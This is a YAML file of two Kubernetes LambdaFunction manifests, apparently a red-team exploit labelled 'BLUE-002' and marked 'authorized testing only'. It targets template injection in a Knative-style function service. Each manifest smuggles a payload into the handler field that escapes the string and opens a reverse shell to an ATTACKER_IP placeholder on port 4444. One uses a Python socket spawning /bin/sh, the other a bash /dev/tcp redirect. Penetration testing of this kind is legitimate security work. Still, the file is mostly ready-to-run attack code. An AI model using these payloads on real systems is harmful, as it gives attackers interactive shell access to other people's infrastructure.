# BLUE-002: Go Template Injection - Reverse Shell
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit establishes a reverse shell connection to the attacker.
# Provides interactive access to the Lambda pod.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-reverse-shell-python
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "reverse-shell"
  annotations:
    redteam.knative.io/description: "Python reverse shell via template injection"
    redteam.knative.io/attacker-ip: "REPLACE_WITH_ATTACKER_IP"
    redteam.knative.io/attacker-port: "4444"
spec:
  source:
    type: inline
    inline:
      code: |
        def handler(event):
            return {"status": "ok"}
  runtime:
    language: python
    version: "3.11"
    # PAYLOAD: Python reverse shell
    # Replace ATTACKER_IP and PORT
    handler: '"; import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"ATTACKER_IP\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"]); x="'
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-reverse-shell-bash
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "reverse-shell-bash"
  annotations:
    redteam.knative.io/description: "Bash reverse shell via os.system"
spec:
  source:
    type: inline
    inline:
      code: |
        def handler(event):
            return {"status": "ok"}
  runtime:
    language: python
    version: "3.11"
    # PAYLOAD: Bash reverse shell via os.system
    handler: '"; import os; os.system(\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"); x="'
